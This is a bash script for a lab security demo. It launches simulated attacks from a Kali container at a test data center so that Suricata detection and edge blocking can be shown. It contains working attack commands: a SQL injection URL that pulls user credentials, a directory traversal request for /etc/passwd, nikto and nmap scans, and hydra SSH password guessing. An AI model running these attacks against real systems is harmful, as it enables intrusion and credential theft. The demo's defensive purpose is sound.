#!/usr/bin/env bash
# Attack simulation for the security demo. The attacker (kali, 203.0.113.10) is an ordinary Internet host behind
# ISP A; its only target is the data center's public address on ISP A, 10.0.0.1 (edge-r1).
#   ./scripts/attack.sh web          web attacks: SQL injection, directory traversal, nikto scanner
#   ./scripts/attack.sh recon        port scan of the public address (nmap SYN scan)
#   ./scripts/attack.sh bruteforce   SSH password guessing (hydra)
#   ./scripts/attack.sh status       what the IDS saw, who is blocked, can the attacker still reach the site
#   ./scripts/attack.sh unblock      remove all blocked addresses (they also expire after 10 min)
# Suricata on edge-r1 detects each attack; priority 1-2 alerts block the attacker at the edge for 10 minutes.
P=clab-mini-dc
K="docker exec $P-kali"
T=10.0.0.1

reach() {  # can the attacker load the public website?
  if $K curl -sk -m3 -o /dev/null --resolve www.dc.lab:443:$T https://www.dc.lab; then echo "reachable"; else echo "BLOCKED"; fi
}

case "$1" in
  web)
    echo "== Web attacks from kali against http://$T"
    $K curl -s -m3 -o /dev/null -w "   SQL injection         -> HTTP %{http_code}\n" \
       "http://$T/products.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users"
    $K curl -s -m3 -o /dev/null --path-as-is -w "   directory traversal   -> HTTP %{http_code}\n" "http://$T/../../../etc/passwd"
    echo "   nikto web scanner (20 s)..."; $K timeout 25 nikto -h http://$T -maxtime 20s -nointeractive >/dev/null 2>&1
    ;;
  recon)
    echo "== Port scan of $T from kali (nmap -sS, ports 1-200; once blocked, nmap only gets timeouts: capped at 40 s)"
    $K nmap -sS -Pn -T4 -p 1-200 --max-retries 0 --host-timeout 40s $T | grep -E "open|filtered|Nmap done"
    ;;
  bruteforce)
    echo "== SSH password guessing against $T (hydra, 8 passwords), then the attacker keeps knocking on port 22"
    $K timeout 15 hydra -l root -P /root/passwords.txt -t 4 -W 1 -w 3 -f ssh://$T 2>&1 | grep -E "\[(ERROR|DATA|ssh)\]|attempt" | head -3
    $K sh -c "for i in 1 2 3 4 5 6 7 8; do nc -z -w1 $T 22; done"   # SSH is not even exposed: every try is dropped
    ;;
  status)
    for e in edge-r1 edge-r2; do
      echo "== $e: $(docker exec $P-$e cat /run/dc-ips/alerts) IDS alert(s), blocked now: $(docker exec $P-$e sh -c \
           "nft list set inet edge blocklist | grep -oE '([0-9]+\.){3}[0-9]+ timeout [0-9a-z]+ expires [0-9a-z]+' || echo none")"
      docker exec $P-$e sh -c 'tail -4 /var/log/suricata/fast.log | sed "s/^[0-9/:.-]*  \[\*\*\] \[[0-9:]*\] /   /; s/ \[\*\*\] \[Classification.*\] {/  {/"'
    done
    echo "== website from the attacker: $(reach)"
    ;;
  unblock)
    for e in edge-r1 edge-r2; do docker exec $P-$e nft flush set inet edge blocklist; done
    echo "blocklists cleared - website from the attacker: $(reach)"
    ;;
  *) sed -n '2,10p' "$0"; exit 1 ;;
esac
